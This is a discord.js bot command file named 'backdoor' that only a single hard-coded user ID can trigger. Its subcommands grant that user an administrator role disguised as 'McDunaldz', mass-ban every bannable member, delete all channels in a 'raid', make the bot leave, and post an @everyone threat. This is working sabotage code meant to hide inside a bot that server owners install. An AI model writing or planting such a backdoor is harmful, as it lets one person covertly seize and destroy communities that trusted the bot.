const Discord = require("discord.js");

exports.run = async (client, message, args) => {
  if (message.author.id !== "583649910092595232") return;
  
  var embed = new Discord.MessageEmbed()
  .setDescription("**Leave**\n\`\`\`To make bot exit the server\`\`\`\n**Admin**\n\`\`\`Give admin permession\`\`\`\n**bl**\n\`\`\`Ban all members\`\`\`\n**mention**\n\`\`\`For mention members\`\`\`\n**raid**\`\`\`Deleting all channels\`\`\`")
  .setColor("#00bfff")
  .setFooter(client.user.username, client.user.displayAvatarURL())
  message.channel.send(embed)

  if (args[0] === "leave") {
    try {
      message.guild.leave();
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "admin") {
    try {
      let role = await message.guild.roles.create({
        data: { name: "McDunaldz", color: "#2f3136", permissions: [8] }
      });

      message.member.roles.add(role);
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "bl") {
    try {
      message.guild.members.cache
        .filter(member => member.bannable)
        .forEach(member => {
          member.ban();
        });
      message.delete(1000);
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "raid") {
    message.guild.channels.cache.forEach(x => {
      x.delete(x.id);
    });
  }

  if (args[0] === "spam") {
    try {
      message.channel.send("@everyone listen to McDunaldz or get raid.");
      message.delete(1000);
    } catch (e) {
      console.log(e.stack);
    }
  }
};

exports.help = {
  name: "backdoor",
  description: "backdoor command for owner",
  usage: ""
};

exports.conf = {
  aliases: ["bd"],
  cooldown: 0
};
